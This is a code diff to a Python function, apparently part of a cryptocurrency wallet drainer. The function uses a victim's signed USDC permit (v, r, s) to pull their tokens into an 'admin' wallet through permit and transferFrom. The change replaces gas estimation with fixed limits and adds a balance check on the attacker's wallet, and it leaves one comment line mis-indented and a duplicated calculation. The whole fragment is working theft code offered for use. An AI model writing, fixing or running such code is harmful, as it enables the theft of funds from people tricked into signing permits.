@@ -89,17 +89,16 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
         max_priority_fee = w3.eth.max_priority_fee or w3.to_wei(1.5, 'gwei')
         max_fee_per_gas = base_fee + max_priority_fee * 2   # 2x priority as safety
 
-        # Estimate gas for both calls
-        permit_gas_estimate = contract.functions.permit(
-            victim_addr, admin_addr, amount_raw, int(deadline), int(v),
-            w3.to_bytes(hexstr=r), w3.to_bytes(hexstr=s)
-        ).estimate_gas({'from': admin_addr})
+# Use standard gas limits for USDC Permit & Transfer
+        # Permit usually takes ~50k-70k, TransferFrom takes ~50k-60k.
+        permit_gas_limit = 100000
+        transfer_gas_limit = 100000
 
-        transfer_gas_estimate = contract.functions.transferFrom(
-            victim_addr, admin_addr, amount_raw
-        ).estimate_gas({'from': admin_addr})
+        total_gas_estimate = permit_gas_limit + transfer_gas_limit
+        required_eth = total_gas_estimate * max_fee_per_gas
 
-        total_gas_estimate = int((permit_gas_estimate + transfer_gas_estimate) * 1.25)  # 25% buffer
+        if admin_eth_balance < required_eth * 1.1:
+            return None, f"ADMIN_WALLET_ERROR: Insufficient ETH. Need ~{w3.from_wei(required_eth, 'ether'):.5f} ETH"
 
         required_eth = total_gas_estimate * max_fee_per_gas
 
